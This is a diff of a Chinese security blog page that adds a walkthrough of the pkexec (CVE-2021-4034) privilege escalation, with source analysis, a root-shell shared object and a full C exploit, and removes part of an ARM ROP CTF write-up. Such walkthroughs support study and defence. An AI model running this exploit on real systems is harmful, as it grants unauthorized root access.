@@ -168,6 +168,151 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-202104034%20pkexec%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/12/CVE-202104034%20pkexec%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="post-title-link" itemprop="url">CVE-202104034 pkexec权限提升</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-12 06:55:06 / Modified: 18:59:35" itemprop="dateCreated datePublished" datetime="2023-04-12T06:55:06+08:00">2023-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%A8%8B%E5%BA%8F%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">程序漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="下载源码并编译"><a href="#下载源码并编译" class="headerlink" title="下载源码并编译"></a>下载源码并编译</h2><p>我的 Linux 是 Kali 系统，查看自带的 pkexec 版本，以及下载对应的源代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/CVEs/CVE-2021-4034 [1:26:04]</span><br><span class="line">$ pkexec --version</span><br><span class="line">pkexec version 0.105</span><br><span class="line"># kali @ kali in ~/CVEs/CVE-2021-4034 [1:26:54] C:1</span><br><span class="line">$ dpkg -S pkexec</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-185538532.png" alt="undifined"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~/CVEs/CVE-2021-4034 [1:29:34]</span><br><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">├── debug</span><br><span class="line">├── payload</span><br><span class="line">├── policykit-1_0.105-31+kali1.debian.tar.xz</span><br><span class="line">├── policykit-1_0.105-31+kali1.dsc</span><br><span class="line">├── policykit-1_0.105.orig.tar.gz</span><br><span class="line">└── polkit-0.105</span><br><span class="line"></span><br><span class="line">3 directories, 3 files</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-2023-0412-185558893.png" alt="undifined"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞成因是在解析命令行参数数组 argv 时，发生了数组越界读，随后又发生了数组越界写到环境变量数组，导致第一个环境变量可被修改。接下来会分别从程序正常运行流程和漏洞触发流程进行分析。</p>
+<h3 id="正常执行流程"><a href="#正常执行流程" class="headerlink" title="正常执行流程"></a>正常执行流程</h3><p>在 pkexec 工具的 main 函数中，使用如下的 for 循环来处理所有的命令行参数，方式是读取 argv[1] 到 argv[argc] 并进行比较，设置相应的标志位。</p>
+<p><img src="/images/image-2023-0412-185615265.png" alt="undifined"></p>
+<p>使用了一个断言，argv[argc] 必须为 NULL。从 argv[n] 开始复制字符串到 path 变量中，如果 path 等于 NULL，打印帮助信息并退出；如果 path[0] 不是以 &#x2F; 字符开始的，则从 PATH 环境变量中以 path 字符串搜索应用程序是否存在，并将结果复制到变量 s，如果应用程序存在，则将应用程序路径重新赋值给变量 path 和 argv[n]。main 函数中也会重新构造新的命令行参数列表。</p>
+<p><img src="/images/image-2023-0412-185631823.png" alt="undifined"></p>
+<p>变量 path 和新的命令行参数会一起送入到 execv 函数执行。</p>
+<p><img src="/images/image-2023-0412-185649089.png" alt="undifined"></p>
+<h3 id="漏洞触发流程"><a href="#漏洞触发流程" class="headerlink" title="漏洞触发流程"></a>漏洞触发流程</h3><p>在解析命令行参数的时候，使用了循环变量 n，但是 n 的初始值是 1。如果 pkexec 传入的命令行参数为空，即 argc &#x3D; 1，argv[0] 等于应用程序名，argv[0] &#x3D; NULL。那么当参数解析流程结束时，变量 n &#x3D; 1，那么在此处 argv[1] 存在越界读。</p>
+<p><img src="/images/image-2023-0412-185702110.png" alt="undifined"></p>
+<p>同样，在此处存在越界写入到 argv[1]。</p>
+<p><img src="/images/image-2023-0412-185715716.png" alt="undifined"></p>
+<p>当 execve 执行一个新程序的时候，内核会将命令参数指针 argv、环境变量字符串指针 envp 复制到新程序堆栈的中，如下所示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|---------+---------+-----+------------|---------+---------+-----+------------| </span><br><span class="line">| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] | </span><br><span class="line">|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------| </span><br></pre></td></tr></table></figure>
+
+<p>因为 argv 和 envp 在内存中是连续的，当 argc 等于 0，那么前面所说的 argv[n] &#x3D; argv[1] 也就是 envp[0]。</p>
+<p>以上就是漏洞触发的原理，接下来梳理一下漏洞触发的完整流程，假设 pkexec 是通过 execve 调用，设置 argv &#x3D; NULL，envp &#x3D; xxx：</p>
+<ol>
+<li><p>在 481 行 for 循环中初始化变量 n &#x3D; 1</p>
+</li>
+<li><p>在 537 行，出现越界读 argv[n] &#x3D; argv[1] &#x3D; envp[0] 到变量 path</p>
+<p>那么此时有 path &#x3D; “xxx”</p>
+</li>
+<li><p>在 546 行，s &#x3D; g_find_program_in_path(path)</p>
+<p>s 从环境变量 PATH 中搜索 xxx 程序的绝对路径，假设是 &#x2F;usr&#x2F;bin&#x2F;xxx</p>
+</li>
+<li><p>在 553 行，出现越界写 argv[n] &#x3D; argv[1] &#x3D; s，即 envp[0] &#x3D; {“&#x2F;usr&#x2F;bin&#x2F;xxx”, …}，环境变量数组第一个元素被覆盖</p>
+</li>
+</ol>
+<p>综上，使用 execve 调用 pkexec，设置命令行参数列表 argv 为 NULL，就可以通过对 envp[0] 进行越界读写。但是，写入的 envp[0] 不会存在很久，因为在源码中会对所有的环境变量进行清除。那么越界写入的环境变量就只能存在于 555~602 行代码中。</p>
+<p><img src="/images/image-2023-0412-185733664.png" alt="undifined"></p>
+<p>除此之外，Linux 的动态链接器 ld-linux-x86-64.so.2 会在特权程序执行时，清除一些敏感环境变量，其中就包括 GCONV_PATH 以及其他的一些具有动态加载路径的环境变量，防止低权限用户通过这些环境变量利用 SUID 权限程序造成提权。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>通过之前的分析，知道 pkexec 中存在越界读写环境变量漏洞，但是越界写入的环境变量的生命周期只能从 555~602 行。pkexec 是具有 SUID 权限的，普通用户可以以 root 权限运行 pkexec。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls -la /usr/local/bin/pkexec</span><br><span class="line">-rwsr-xr-x 1 root root 64440 Feb  2 02:25 /usr/local/bin/pkexec</span><br></pre></td></tr></table></figure>
+
+<p>在 pkexec 的源码中使用了很多次的 g_printer 函数用于输出错误信息。如果环境变量 CHARSET 不是 UTF-8，g_printer 会调用 glibc 的 iconv_open 函数，将消息转换成 UTF-8。iconv_open 函数的执行流程是：先找到系统提供的 gconv-modules 配置文件，在这个文件中包含了各种字符集相关信息的存储路径，每个字符集的相关信息存储在一个 so 文件中。</p>
+<p>综上：gconv-modules 配置文件提供了每个字符集 so 文件所在位置，之后会调用 so 文件中的 gconv 和 gconv_init 函数，如果修改系统的 GCONV_PATH 环境变量，也就能修改 gconv-modules 配置文件的位置，从而执行恶意的 so 文件实现任意命令执行。本质上都是想办法触发 g_printer 函数，调用恶意 so。</p>
+<p>利用的流程是：</p>
+<ol>
+<li><p>创建环境变量指向的目录文件结构</p>
+<p>首先创建一个名为 GCONV_PATH&#x3D;. 的文件夹，然后在其中再创建一个名为 GCONV_PATH&#x3D;.&#x2F;lol，以及创建一个目录名为 lol 目录存放恶意的 so 文件。然后再创建一个文件 lol&#x2F;gconv-modules，其中内容为 module UTF-8&#x2F;&#x2F; PWNKIT&#x2F;&#x2F; pwnkit 1。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali @ kali <span class="keyword">in</span> ~/CVEs/CVE-2021-4034/payload [22:09:38]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 2</span></span><br><span class="line">.</span><br><span class="line">├── GCONV_PATH=.</span><br><span class="line">│   └── lol</span><br><span class="line">└── lol</span><br><span class="line">    └── gconv-modules</span><br><span class="line"></span><br><span class="line">2 directories, 2 files</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>构造恶意的 so 文件</p>
+<p>在 lol 文件夹中编译一个恶意的 so，代码示例如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o payload.so -shared -fPIC payload.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">()</span> &#123;</span><br><span class="line">    setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>); setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *a_argv[] = &#123; <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *a_envp[] = &#123; <span class="string">&quot;PATH=/bin:/usr/bin:/sbin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, a_argv, a_envp);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali @ kali <span class="keyword">in</span> ~/CVEs/CVE-2021-4034/payload [22:40:51]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 2</span></span><br><span class="line">.</span><br><span class="line">├── GCONV_PATH=.</span><br><span class="line">│   └── lol</span><br><span class="line">├── lol</span><br><span class="line">│   └── gconv-modules</span><br><span class="line">├── payload.c</span><br><span class="line">└── payload.so</span><br><span class="line"></span><br><span class="line">2 directories, 4 files</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用 execve 调用 pkexec 并带入恶意的 envp 环境变量数组</p>
+<p>设置恶意环境变量 envp 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *a_envp[] = &#123;</span><br><span class="line">	<span class="string">&quot;lol&quot;</span>,					<span class="comment">// 触发越界写，使得a_envp[0]=GCONV_PATH=./lol</span></span><br><span class="line">	<span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,	<span class="comment">// g_find_program_in_path函数查找lol，在给GCONV_PATH=./lol</span></span><br><span class="line">	<span class="string">&quot;CHARSET=PWNKIT&quot;</span>,		<span class="comment">// 触发调用g_printerr函数，从而调用恶意的so文件</span></span><br><span class="line">	<span class="string">&quot;SHELL=lol&quot;</span>, 			<span class="comment">// 调用g_printerr函数，调用恶意so文件</span></span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就使用 execve 调用 pkexec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(&quot;pkexec&quot;, NULL, a_envp);</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>综上，exp 如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fatal</span><span class="params">(<span class="type">char</span> *f)</span> &#123;</span><br><span class="line">    perror(f);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">compile_so</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;payload.c&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fatal(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> so_code[]=</span><br><span class="line">        <span class="string">&quot;#include &lt;stdio.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;stdlib.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;#include &lt;unistd.h&gt;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv() &#123;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  return;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&#125;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;void gconv_init() &#123;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  setuid(0); seteuid(0); setgid(0); setegid(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  static char *a_argv[] = &#123; \&quot;sh\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  static char *a_envp[] = &#123; \&quot;PATH=/bin:/usr/bin:/sbin\&quot;, NULL &#125;;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  execve(\&quot;/bin/sh\&quot;, a_argv, a_envp);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;  exit(0);\n&quot;</span></span><br><span class="line">        <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fwrite(so_code, <span class="built_in">strlen</span>(so_code), <span class="number">1</span>, f);</span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;gcc -o payload.so -shared -fPIC payload.c&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="type">char</span> *a_argv[]=&#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *a_envp[]=&#123;</span><br><span class="line">        <span class="string">&quot;lol&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">        <span class="string">&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XAUTHORITY=../LOL&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[~] compile helper..\n&quot;</span>);</span><br><span class="line">    compile_so();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">&quot;GCONV_PATH=.&quot;</span>, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">&quot;GCONV_PATH=.&quot;</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> fd = open(<span class="string">&quot;GCONV_PATH=./lol&quot;</span>, O_CREAT|O_RDWR, <span class="number">0777</span>); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">&quot;lol&quot;</span>, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">&quot;lol&quot;</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;mkdir&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        FILE *fp = fopen(<span class="string">&quot;lol/gconv-modules&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            fatal(<span class="string">&quot;fopen&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;module  UTF-8//    INTERNAL    ../payload    2\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[~] maybe get shell now?\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, a_argv, a_envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行截图：</p>
+<p><img src="/images/image-2023-0412-185754349.png" alt="undifined"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/joeammond/CVE-2021-4034">[Github] CVE-2021-4034</a> </li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/321066.html">[freebuf] CVE-2021-4034 Linux Polkit 权限提升漏洞挖掘思路解读</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10870">[先知社区] CVE-2021-4034 深入分析及漏洞复现</a></li>
+<li><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/876.html">CVE-2021-4034 pkexec提权漏洞分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">[CSDN] 使用GCONV_PATH与iconv进行bypass disable_functions</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/CVE-2019-10999%20dlink%20ip%E6%91%84%E5%83%8F%E5%A4%B4%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1174,107 +1319,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/10/split_armel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/10/split_armel/" class="post-title-link" itemprop="url">split_armel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-04-10 05:03:33" itemprop="dateCreated datePublished" datetime="2023-04-10T05:03:33+08:00">2023-04-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:57:30" itemprop="dateModified" datetime="2023-04-11T13:57:30+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/ARMROP/" itemprop="url" rel="index"><span itemprop="name">ARMROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题目的目的是使用ROP调用system函数，并设置参数为字符串<code>/bin/cat flags</code>的地址。总的来说，就是要了解armel的函数传参方式，然后调用相应的gadget。<br>分析pwnme函数，局部变量s的大小是36，但是可以传入0x60个字节，因此存在缓冲区溢出。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [sp+0h] [bp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x60</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个地方再说一下armel下的函数栈帧开辟和释放流程吧：<br>在函数初始化阶段，先将R11和LR两个寄存器保存到栈上，然后将SP+4的大小保存到R11上，最后SP自减0x20来开辟了栈帧。<br>R11也叫做FP（Frame Pointer）寄存器，类似于x86下的EBP寄存器，用于和SP一起界定函数栈栈的边界。FP寄存器就是指向栈底，SP寄存器就是指向栈顶。<br>pwnme函数是在main函数中通过BL指令跳转执行，BL指令会将其下一条指令作为pwnme函数的返回地址保存到LR寄存器中。因此在pwnme函数中保存到栈上的LR寄存器值就是需要通过缓冲区溢出进行修改的关键数据。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00010570                 PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:00010574                 ADD     R11, SP, #4</span><br><span class="line">.text:00010578                 SUB     SP, SP, #0x20</span><br></pre></td></tr></table></figure>
-<p>在pwnme函数的结尾，会将R11+4的值赋值给SP，来做栈平衡。函数返回地址的跳转是直接通过POP指令将栈上的函数返回地址恢复到PC中。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:000105C0                 SUB     SP, R11, #4</span><br><span class="line">.text:000105C4                 POP     &#123;R11,PC&#125;</span><br></pre></td></tr></table></figure>
-<p>和mipsel架构不同，armel的SP寄存器在函数的生命周期里面都是变化的，因此如果要定位、计算栈上变量的位置，可以用FP寄存器来计算。pwnme函数的局部变量s起始地址为fp-0x24，返回地址保存在fp，因此需要0x24个字节填充后，覆盖返回地址。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>经过观察，发现armel下的split不像mipsel，有UsefulGadgets可以直接使用。因此，需要自己去找gadgets了。<br>调用system函数需要知道system函数地址和传入的字符串，二者都在程序中。那么难点就是如何去传参。</p>
-<ol>
